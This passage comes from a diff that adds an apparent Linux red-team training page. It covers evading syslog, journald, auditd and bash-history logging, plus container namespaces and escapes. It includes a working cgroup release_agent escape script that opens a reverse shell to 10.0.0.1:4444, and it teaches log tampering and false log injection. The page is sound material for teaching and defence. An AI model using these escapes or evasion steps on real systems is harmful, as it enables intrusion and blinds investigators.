+        <div class="cl-item">Create and deploy LD_PRELOAD hooking libraries</div>
+        <div class="cl-item">Understand ELF binary structure</div>
+      </div>
+    `
+  },
+  {
+    id: 'm9', title: 'Linux Logging and Detection', num: '09',
+    content: `
+      <p>Linux systems generate extensive logging data through multiple subsystems. For red team operators, understanding what gets logged, where logs are stored, and how to evade detection is essential. This module covers the major logging systems on Linux — syslog, journald, auditd, and shell history — and provides techniques for operating stealthily while achieving objectives.</p>
+
+      <h3>Traditional Syslog (rsyslog/syslog-ng)</h3>
+      <p>The syslog system collects log messages from applications and the kernel, categorizing them by facility (auth, authpriv, cron, daemon, kern, mail, syslog, user, local0-7) and priority (emerg, alert, crit, err, warning, notice, info, debug). Configuration is in <span class="pth">/etc/rsyslog.conf</span> and <span class="pth">/etc/rsyslog.d/</span>. Log files are typically stored in <span class="pth">/var/log/</span> with names like <span class="pth">auth.log</span> (authentication), <span class="pth">syslog</span> (general system), <span class="pth">kern.log</span> (kernel), and <span class="pth">dmesg</span> (kernel ring buffer).</p>
+
+      <div class="cb"><span class="cmt"># Check syslog configuration</span>
+cat /etc/rsyslog.conf | grep -E <span class="flg">"^[^#]"</span>
+
+<span class="cmt"># View authentication logs</span>
+tail -50 /var/log/auth.log
+<span class="cmt"># or on RHEL-based:</span>
+tail -50 /var/log/secure
+
+<span class="cmt"># Check for failed SSH attempts</span>
+grep <span class="flg">"Failed password"</span> /var/log/auth.log | tail -20
+
+<span class="cmt"># View kernel logs</span>
+dmesg | tail -30
+
+<span class="cmt"># Send a test log entry</span>
+logger -p authpriv.info <span class="flg">"Test message from redteam"</span></div>
+
+      <div class="ab">
+        <div class="block-label">Attack Relevance</div>
+        <b>Log Evasion Techniques:</b> When executing commands that would normally log (like <span class="cmd">sudo</span>), consider using <span class="cmd">sudo -s</span> instead of <span class="cmd">sudo su -</span> (different logging footprints). The <span class="cmd">logger</span> command can be used to inject false log entries to confuse investigators. On some systems, deleting or truncating log files is possible but highly visible — modifying the specific log entries is more stealthy but requires root access.
+      </div>
+
+      <h3>systemd-journald</h3>
+      <p>Modern Linux distributions use <span class="cmd">systemd-journald</span> as the primary logging daemon. Logs are stored in binary format under <span class="pth">/var/log/journal/</span> (persistent) or <span class="pth">/run/log/journal/</span> (volatile). The <span class="cmd">journalctl</span> tool is used to query journal logs with powerful filtering capabilities. Journald can forward logs to traditional syslog for backwards compatibility. Logs are indexed and compressed, making them more efficient but harder to modify directly.</p>
+
+      <div class="cb"><span class="cmt"># View all journal logs</span>
+journalctl
+
+<span class="cmt"># Filter by unit</span>
+journalctl -u sshd.service
+
+<span class="cmt"># Filter by time</span>
+journalctl --since <span class="flg">"2024-01-01 00:00:00"</span> --until <span class="flg">"2024-01-02 00:00:00"</span>
+
+<span class="cmt"># Follow new entries (like tail -f)</span>
+journalctl -f
+
+<span class="cmt"># View kernel messages only</span>
+journalctl -k
+
+<span class="cmt"># Check journald disk usage</span>
+journalctl --disk-usage
+
+<span class="cmt"># Rotate and limit journal size (if root)</span>
+journalctl --rotate
+journalctl --vacuum-size=100M</div>
+
+      <div class="wb">
+        <div class="block-label">Warning</div>
+        Modifying or deleting journal logs requires root access and can be detected. The <span class="cmd">journalctl --rotate</span> command archives the current journal, and <span class="cmd">journalctl --vacuum-size</span> or <span class="cmd">--vacuum-time</span> can remove old entries. However, these operations are themselves logged on systems with auditd configured. Consider the risk-reward tradeoff before attempting log manipulation.
+      </div>
+
+      <h3>Linux Audit Daemon (auditd)</h3>
+      <p>Auditd is the most comprehensive auditing system on Linux, capable of monitoring every system call, file access, and security event. Rules are defined with <span class="cmd">auditctl</span> and persist in <span class="pth">/etc/audit/rules.d/</span>. Audit logs are written to <span class="pth">/var/log/audit/audit.log</span> in a structured key-value format. From a red team perspective, auditd is the most significant detection challenge because it can capture events at the kernel level, before any evasion technique can hide them.</p>
+
+      <div class="cb"><span class="cmt"># Check if auditd is running</span>
+systemctl status auditd
+
+<span class="cmt"># View audit rules</span>
+auditctl -l
+
+<span class="cmt"># Search audit logs for specific syscalls</span>
+ausearch -sc execve --start today
+
+<span class="cmt"># Search for file access events</span>
+ausearch -f /etc/shadow --start today
+
+<span class="cmt"># Generate audit report</span>
+aureport --summary
+
+<span class="cmt"># Check for auditd events from our process</span>
+ausearch -p $$ --start today 2>/dev/null</div>
+
+      <div class="ab">
+        <div class="block-label">Attack Relevance</div>
+        <b>Auditd Evasion:</b> Auditd rules can be bypassed by modifying the audit rules themselves (requires root), using <span class="cmd">auditctl -D</span> to delete all rules (highly visible), or by using syscalls that bypass the audit subsystem. Some advanced techniques involve exploiting race conditions between the audit system and the actual syscall execution. In practice, the best approach is to avoid triggering audited paths or to understand what is and is not being monitored.
+      </div>
+
+      <h3>Bash History and Shell Logging</h3>
+      <p>Bash records command history to <span class="pth">~/.bash_history</span>. The <span class="cmd">HISTFILE</span>, <span class="cmd">HISTSIZE</span>, and <span class="cmd">HISTFILESIZE</span> environment variables control history behavior. Commands prefixed with a space are not recorded if <span class="cmd">HISTCONTROL</span> includes <span class="cmd">ignorespace</span>. The <span class="cmd">history -c</span> command clears the current session history, and <span class="cmd">history -w</span> writes it to the file. For maximum stealth, many operators use <span class="cmd">unset HISTFILE</span> or redirect history to <span class="pth">/dev/null</span>.</p>
+
+      <div class="cb"><span class="cmt"># Disable bash history for current session</span>
+unset HISTFILE
+<span class="cmt"># or</span>
+export HISTFILE=/dev/null
+
+<span class="cmt"># Clear history after commands are run</span>
+<span class="cmd">history</span> -c && <span class="cmd">history</span> -w
+
+<span class="cmt"># Run a command without logging (space prefix)</span>
+<span class="flg">[space]</span>command_here
+<span class="cmt"># Requires: export HISTCONTROL=ignorespace</span>
+
+<span class="cmt"># Check .bash_history for interesting commands</span>
+cat ~/.bash_history | grep -E <span class="flg">"(sudo|ssh|passwd|su)"</span></div>
+
+      <div class="mm">
+        <div class="block-label">Mental Model</div>
+        Logging on Linux is like a building with multiple security camera systems. Syslog is the front desk logbook — anyone can see who signed in. Journald is like the digital keycard system — it records every door opening with precise timestamps. Auditd is like having security guards stationed at every critical junction who radio in every movement. Shell history is like the browser history on a public terminal — trivially cleared but often forgotten. A smart operator knows which cameras cover which areas and plans their movements accordingly.
+      </div>
+
+      <div class="lb">
+        <div class="block-label">Lab Exercise</div>
+        <b>Objective:</b> Practice log analysis and evasion.<br>
+        <b>1.</b> Run <span class="cmd">journalctl -u sshd.service --since "1 hour ago"</span> and analyze the output.<br>
+        <b>2.</b> Execute a command with a space prefix (after setting <span class="cmd">HISTCONTROL=ignorespace</span>) and verify it doesn't appear in <span class="pth">~/.bash_history</span>.<br>
+        <b>3.</b> Check if auditd is running and review existing rules with <span class="cmd">auditctl -l</span>.<br>
+        <b>4.</b> Practice using <span class="cmd">ausearch</span> to find specific events.
+      </div>
+
+      <div class="cl-section"><div class="cl-title">Module Checklist</div>
+        <div class="cl-item">Navigate syslog and journald logs</div>
+        <div class="cl-item">Evade bash history recording</div>
+        <div class="cl-item">Understand auditd capabilities and limitations</div>
+        <div class="cl-item">Use journalctl for log analysis</div>
+      </div>
+    `
+  },
+  {
+    id: 'm10', title: 'Linux Containers and Namespaces', num: '10',
+    content: `
+      <p>Containers have become ubiquitous in modern Linux deployments, running everything from development environments to production workloads. While containers provide isolation through kernel namespaces and cgroups, they share the same kernel as the host, creating unique attack surfaces. This module covers container internals, namespace isolation, cgroups, and proven container escape vectors that red team operators must understand.</p>
+
+      <h3>Namespaces: The Foundation of Container Isolation</h3>
+      <p>Linux namespaces wrap global system resources in abstractions that make processes inside the namespace think they have their own isolated instance of the resource. There are eight namespace types: Mount (mnt), Process ID (pid), Network (net), Interprocess Communication (ipc), UTS (hostname), User ID (user), Cgroup (cgroup), and Time (time). Each namespace type isolates a specific global resource. A container typically uses all namespaces, providing the illusion of a separate system.</p>
+
+      <div class="ascii">┌──────────────────────────────────────────────────────────┐
+│                    Host Kernel                            │
+│  ┌────────────────────────────────────────────────────┐  │
+│  │              Initial Namespaces                    │  │
+│  │  PID=1(init)  NET=eth0  MNT=/  UID=0(root)       │  │
+│  └──────────┬─────────────────────────────────────────┘  │
+│             │                                             │
+│    ┌────────┴────────┐                                    │
+│    │                 │                                    │
+│    ▼                 ▼                                    │
+│  ┌────────┐    ┌────────┐                                 │
+│  │Cont A  │    │Cont B  │                                 │
+│  │PID:1   │    │PID:1   │  (isolated PID namespace)      │
+│  │NET:veth│    │NET:veth│  (isolated network)             │
+│  │MNT:/A  │    │MNT:/B  │  (isolated filesystem)         │
+│  │UID:0   │    │UID:0   │  (isolated user namespace)      │
+│  └────────┘    └────────┘                                 │
+│  But all share same kernel!                               │
+└──────────────────────────────────────────────────────────┘</div>
+
+      <div class="ab">
+        <div class="block-label">Attack Relevance</div>
+        <b>Namespace Escape:</b> If a container runs with the <span class="cmd">--privileged</span> flag, all capabilities are granted and host devices are accessible. From a privileged container, escaping to the host is trivial: mount the host filesystem via a raw disk device, or use <span class="cmd">nsenter</span> to enter the host's namespaces. Even without <span class="cmd">--privileged</span>, a container with <span class="cmd">SYS_ADMIN</span> capability might escape via <span class="cmd">cgroup</span> notify_on_release or by mounting the host's cgroup hierarchy and writing to release_agent.
+      </div>
+
+      <h3>Cgroups (Control Groups)</h3>
+      <p>Cgroups limit and account for resource usage (CPU, memory, disk I/O, network). They are organized hierarchically and managed through the cgroup filesystem (<span class="pth">/sys/fs/cgroup/</span>). The <span class="cmd">cgroup v2</span> unified hierarchy is the modern standard. From a security perspective, cgroupfs is a critical attack surface — if a container can write to parent cgroup interfaces like <span class="cmd">release_agent</span> or <span class="cmd">notify_on_release</span>, it can execute arbitrary commands on the host when the cgroup is released.</p>
+
+      <div class="cb"><span class="cmt"># Classic cgroup escape via release_agent</span>
+<span class="cmt"># Run this INSIDE a container with cgroupfs access:</span>
+mkdir /tmp/cgrp
+mount -t cgroup -o memory cgroup /tmp/cgrp
+mkdir /tmp/cgrp/x
+<span class="cmd">echo</span> 1 > /tmp/cgrp/x/notify_on_release
+host_path=$(sed -n <span class="flg">'s/.*perdir=\\([^,]*\\).*/\\1/p'</span> /etc/mtab)
+<span class="cmd">echo</span> <span class="flg">"$host_path/cmd"</span> > /tmp/cgrp/release_agent
+<span class="cmd">echo</span> <span class="flg">'#!/bin/bash'</span> > /cmd
+<span class="cmd">echo</span> <span class="flg">'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'</span> >> /cmd
+chmod +x /cmd
+sh -c <span class="flg">"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs"</span></div>
+
+      <div class="wb">
+        <div class="block-label">Warning</div>
+        The cgroup release_agent escape has been mitigated in many modern container runtimes by remounting the cgroup filesystem read-only. However, Docker's default seccomp profile still allows <span class="cmd">mount</span> syscall, so if the container has <span class="cmd">SYS_ADMIN</span> capability, this technique may still work. Always check the container's capabilities with <span class="cmd">cat /proc/1/status | grep Cap</span>.
+      </div>
+
+      <h3>Container Escape Vectors Summary</h3>
+      <table class="dtable">
+        <tr><th>Vector</th><th>Requirement</th><th>Difficulty</th></tr>
+        <tr><td>Privileged Container</td><td>--privileged flag</td><td>Easy</td></tr>
+        <tr><td>Cgroup Release Agent</td><td>SYS_ADMIN + cgroupfs access</td><td>Medium</td></tr>
+        <tr><td>Device Mount</td><td>Host device access</td><td>Medium</td></tr>
+        <tr><td>Kernel Exploit</td><td>Unpatched host kernel</td><td>Hard</td></tr>
+        <tr><td>Mount Namespace</td><td>CAP_SYS_ADMIN</td><td>Medium</td></tr>
+        <tr><td>procfs Exploitation</td><td>/proc/1/root writable</td><td>Hard</td></tr>
+        <tr><td>Misconfigured Capabilities</td><td>Specific cap granted</td><td>Variable</td></tr>
+      </table>
+
+      <h3>Container Detection and Enumeration</h3>
+      <p>When you land inside a container, first determine that you're in one. Check for the presence of <span class="pth">/.dockerenv</span> (Docker), examine <span class="pth">/proc/1/cgroup</span> for container-specific entries, check the hostname, and look for container runtime files. The command <span class="cmd">cat /proc/1/sched | head -1</span> shows the init process name — in a container, PID 1 is often the container entrypoint rather than the standard init system.</p>
+
+      <div class="cb"><span class="cmt"># Detect if running inside a container</span>
+<span class="cmd">cat</span> /proc/1/cgroup | grep -E <span class="flg">"(docker|kubepods|container)"</span>
+<span class="cmd">ls</span> -la /.dockerenv 2>/dev/null
+<span class="cmd">cat</span> /proc/1/sched | head -1
+
+<span class="cmt"># Check available capabilities</span>
+<span class="cmd">cat</span> /proc/1/status | grep Cap
+capsh --decode=$(awk <span class="flg">'/'"$1"'/{print $NF}'</span> /proc/1/status | head -1)
+
+<span class="cmt"># Check container runtime version</span>
+strings /proc/1/environ 2>/dev/null | grep -E <span class="flg">"(KUBERNETES|DOCKER|RUNC)"</span>
+
+<span class="cmt"># Check mount points</span>
+mount | grep -E <span class="flg">"(cgroup|proc|sys)"</span></div>
+
+      <div class="ib">
+        <div class="block-label">Info</div>
+        The <span class="cmd">amicontained</span> tool is an excellent open-source utility for container introspection. It checks the container runtime, allowed capabilities, mounted filesystems, seccomp filter status, and AppArmor/SELinux profiles. When possible, upload and run this tool to understand your isolation constraints.
+      </div>
+
+      <div class="mm">
+        <div class="block-label">Mental Model</div>
+        Containers are like private offices in a shared building. Each office has its own key (namespaces) and its own utilities (filesystem), but the building's foundation (kernel) is shared. A privileged container is like giving someone not just their office key, but also the master key to every door, the building maintenance access, and the keys to the utility closets. The cgroup escape is like finding a forgotten maintenance panel in your office that connects to the building's central control system.
+      </div>
+
+      <div class="lb">
+        <div class="block-label">Lab Exercise</div>
+        <b>Objective:</b> Experiment with containers and namespaces.<br>
+        <b>1.</b> Run a container: <span class="cmd">docker run -it --rm ubuntu:latest bash</span><br>
+        <b>2.</b> Inside the container, check <span class="cmd">cat /proc/1/cgroup</span> and <span class="cmd">ls /.dockerenv</span> to confirm containment.<br>
+        <b>3.</b> Run a privileged container: <span class="cmd">docker run -it --rm --privileged ubuntu:latest bash</span> and escape by mounting the host.<br>
+        <b>4.</b> Create a new namespace manually: <span class="cmd">unshare --mount --pid --fork bash</span> and observe the isolation.
+      </div>
+
+      <div class="cl-section"><div class="cl-title">Module Checklist</div>
+        <div class="cl-item">Understand the 8 Linux namespace types</div>
+        <div class="cl-item">Detect container environments</div>
+        <div class="cl-item">Exploit cgroup release_agent escape</div>
+        <div class="cl-item">Escape privileged containers</div>
+        <div class="cl-item">Understand container security limitations</div>
+      </div>
+    `
+  }
+];
+
+// Build sidebar navigation
+const sideNav = document.getElementById('sideNav');
+modules.forEach((m, i) => {
+  const a = document.createElement('a');
+  a.href = '#' + m.id;
+  a.innerHTML = `<span class="dot" id="dot-${m.id}"></span><span class="num">${m.num}</span> ${m.title}`;
+  sideNav.appendChild(a);
+});
+
+// Build modules
+const container = document.getElementById('modulesContainer');
+modules.forEach(m => {
+  const div = document.createElement('div');
+  div.className = 'module';
+  div.id = m.id;
+  div.innerHTML = `
+    <div class="module-header">
+      <div style="display:flex;align-items:center;"><span class="num-badge">${m.num}</span><h2>${m.title}</h2></div>
+      <span class="chevron">▶</span>
+    </div>
+    <div class="module-body">${m.content}</div>
+  `;
+  container.appendChild(div);
+
+  // Header click toggle
+  const header = div.querySelector('.module-header');
+  header.addEventListener('click', () => {
+    div.classList.toggle('open');
+    saveState();
+    updateProgress();
+  });
+
+  // Checklist items
+  div.querySelectorAll('.cl-item').forEach(item => {
+    item.addEventListener('click', () => {
+      item.classList.toggle('done');
+      saveState();
+      updateProgress();
+    });
+  });
+});
+
+function getState() {
+  try { return JSON.parse(localStorage.getItem('linux_rt_state')) || {}; } catch(e) { return {}; }
+}
+
+function saveState() {
+  const state = {};
+  document.querySelectorAll('.module').forEach(mod => {
+    const mid = mod.id;
+    state[mid] = { open: mod.classList.contains('open'), checks: [] };
+    mod.querySelectorAll('.cl-item').forEach(item => {
+      state[mid].checks.push(item.classList.contains('done'));
+    });
+  });
+  state._counts = {};
+  document.querySelectorAll('.module').forEach(mod => {
+    const checks = state[mod.id].checks;
+    state._counts[mod.id] = { done: checks.filter(Boolean).length, total: checks.length };
+  });
+  localStorage.setItem('linux_rt_state', JSON.stringify(state));
+}
+
+function loadState() {
+  const state = getState();
+  document.querySelectorAll('.module').forEach(mod => {
+    const mid = mod.id;
+    if (state[mid]) {
+      if (state[mid].open) mod.classList.add('open');
+      const items = mod.querySelectorAll('.cl-item');
+      state[mid].checks.forEach((done, i) => {
+        if (done && items[i]) items[i].classList.add('done');
+      });
+    }
+  });
+}
+
+function updateProgress() {
+  let total = 0, done = 0;
+  document.querySelectorAll('.module').forEach(mod => {
+    const checks = mod.querySelectorAll('.cl-item');
+    checks.forEach(c => { total++; if (c.classList.contains('done')) done++; });
+    const mid = mod.id;
+    const dot = document.getElementById('dot-' + mid);
+    if (dot) {
+      const itemChecks = mod.querySelectorAll('.cl-item');
+      const allDone = itemChecks.length > 0 && Array.from(itemChecks).every(c => c.classList.contains('done'));
+      dot.classList.toggle('done', allDone);
+    }
+  });
+  const bar = document.getElementById('progressBar');
+  const count = document.getElementById('progressCount');
+  const pct = total > 0 ? (done / total) * 100 : 0;
+  bar.style.width = pct + '%';
+  count.textContent = done + '/' + total;
+}
+
+loadState();
+updateProgress();
+
+// Smooth scroll
+document.querySelectorAll('#sidebar nav a').forEach(a => {
+  a.addEventListener('click', e => {
+    e.preventDefault();
+    const target = document.querySelector(a.getAttribute('href'));
+    if (target) target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+  });
+});
+
+// Active nav tracking
+const observer = new IntersectionObserver(entries => {
+  entries.forEach(entry => {
+    if (entry.isIntersecting) {
+      document.querySelectorAll('#sidebar nav a').forEach(a => a.classList.remove('active'));
+      const a = document.querySelector(`#sidebar nav a[href="#${entry.target.id}"]`);
+      if (a) a.classList.add('active');
+    }
+  });
+}, { rootMargin: '-20% 0px -70% 0px' });
+
+document.querySelectorAll('.module').forEach(mod => observer.observe(mod));
+</script>
+</body>
+</html>
